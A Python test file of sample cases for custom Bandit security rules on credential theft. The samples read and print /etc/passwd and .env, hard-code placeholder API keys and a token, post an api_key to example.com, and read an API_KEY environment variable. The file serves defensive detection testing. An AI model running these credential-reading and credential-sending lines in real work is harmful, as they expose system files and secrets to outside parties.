"""
Credential Theft Test Cases for Bandit Rules
"""

# Test case for B901 - Sensitive credential access
def test_sensitive_credential_access():
    # This will trigger B901 rule
    with open("/etc/passwd", "r") as f:
        print(f.read())
    
    with open(".env", "r") as f:
        print(f.read())

# Test case for B902 - Credential keywords
def test_credential_keywords():
    # This will trigger B902 rule
    api_key = "12345-67890-abcde"
    access_key = "09876-54321-xyz"
    auth_token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9"

# Test case for B903 - Credential transmission
def test_credential_transmission():
    import requests
    # This will trigger B903 rule
    requests.post("https://example.com", data={"api_key": "12345-67890-abcde"})

# Test case for B904 - Environment variable access
def test_environment_variable_access():
    import os
    # This will trigger B904 rule
    os.environ.get("API_KEY")

if __name__ == "__main__":
    test_sensitive_credential_access()
    test_credential_keywords()
    test_credential_transmission()
    test_environment_variable_access()